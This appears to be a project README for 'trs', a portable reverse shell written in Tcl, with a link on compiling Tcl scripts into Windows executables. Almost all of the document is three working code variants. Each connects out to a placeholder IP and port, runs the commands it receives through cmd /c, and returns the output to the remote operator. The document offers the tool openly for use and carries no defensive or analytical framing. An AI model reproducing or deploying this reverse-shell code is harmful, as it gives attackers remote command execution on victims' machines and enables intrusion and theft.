# trs
portable tcl based reverse shell

https://www.tcl.tk/about/language.html

**Compile**

https://wiki.tcl-lang.org/page/How+to+compile+a+TCL+script+into+an+EXE+program



```
set chan [socket IP PORT]
while {1} {                        
   flush $chan                             
   puts $chan [exec cmd /c [gets $chan]] 
   flush $chan
}
```

```
set chan [socket IP PORT]
while {1} {                        
   flush $chan                               
   set fd [open "|cmd /c [gets $chan]" r]
   while {[gets $fd line] >= 0} { puts $chan $line }
   flush $chan
}
```

```
package require twapi
proc runrun {in} {
   set args "/c $in"  
   return 
[twapi::shell_execute -path cmd.exe -noconsole 1 -params $args]
 
}
set chan [socket IP PORT]
while {1} {                        
   flush $chan                             
   puts $chan [runrun [gets $chan]]
   flush $chan
}
```
